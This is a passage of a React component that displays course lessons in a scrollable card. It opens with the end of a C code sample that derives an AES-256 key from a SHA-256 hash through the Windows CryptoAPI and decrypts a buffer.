    CryptAcquireContextW(&hProv, NULL, NULL,
        PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    
    // Create hash of key
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, key, keyLen, 0);
    
    // Derive AES key
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    
    // Decrypt
    *decrypted = (BYTE*)malloc(encLen);
    memcpy(*decrypted, encrypted, encLen);
    *decLen = encLen;
    
    CryptDecrypt(hKey, 0, TRUE, 0, *decrypted, decLen);
    
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    
    return TRUE;
}`,
          language: "c"
        }
      ]
    }
  };

  const currentLesson = lessons[moduleId];

  if (!currentLesson) {
    return (
      <Card className="p-6 bg-card border-border">
        <p className="text-muted-foreground">Select a module to begin learning.</p>
      </Card>
    );
  }

  return (
    <Card className="h-[600px] flex flex-col bg-card border-border">
      <div className="p-4 border-b border-border flex items-center gap-2">
        <BookOpen className="h-5 w-5 text-primary" />
        <h3 className="font-semibold text-foreground">{currentLesson.title}</h3>
      </div>
      
      <ScrollArea className="flex-1 p-6">
        <div className="space-y-8">
          {currentLesson.sections.map((section: any, idx: number) => (
            <div key={idx} className="space-y-3">
              <h4 className="text-lg font-semibold text-foreground">{section.title}</h4>
              <p className="text-sm text-muted-foreground">{section.content}</p>
              
              {section.code && (
                <div className="relative">
                  <Badge className="absolute top-2 right-2 text-xs">
                    {section.language}
                  </Badge>
                  <pre className="bg-muted p-4 rounded-lg overflow-x-auto">
                    <code className="text-xs text-foreground font-mono">{section.code}</code>
                  </pre>
                </div>
              )}
            </div>
          ))}
        </div>
      </ScrollArea>
    </Card>
  );
};

export default LessonViewer;
